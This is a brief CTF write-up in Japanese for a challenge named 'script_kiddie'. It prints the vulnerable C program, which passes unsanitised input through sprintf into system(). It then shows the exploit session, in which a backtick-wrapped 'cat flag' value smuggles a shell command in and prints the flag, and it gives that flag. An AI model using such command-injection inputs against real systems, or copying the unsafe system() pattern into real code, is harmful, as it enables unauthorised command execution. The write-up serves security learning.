# script_kiddie

以下のソースコードより`echo`コマンドによってファイルの中身を出力すれば良いと判断した．`flag`ファイルにFLAGがあると判断して，catコマンドを使いました．

```C
echo cat flag
```

```C
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// バッファリングを無効化して時間制限を60秒に設定
__attribute__((constructor)) void setup() {
  alarm(60);
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
}

void show_flag() {
  char flag_name[0x10] = {};
  printf("Which flag do you want?");
  read(0, flag_name, 0x10);

  char cmd[0x20];
  sprintf(cmd, "echo %s", flag_name);

  // show FLAG
  system(cmd);
}

int main() { show_flag(); }
```


```bash
$ nc 
Which flag do you want?./*
./flag ./script_kiddie ./start.sh
$ nc 
Which flag do you want?`cat flag`
taskctf{n0w_y0u_g0t_shell}
```

```bash
taskctf{n0w_y0u_g0t_shell}
```
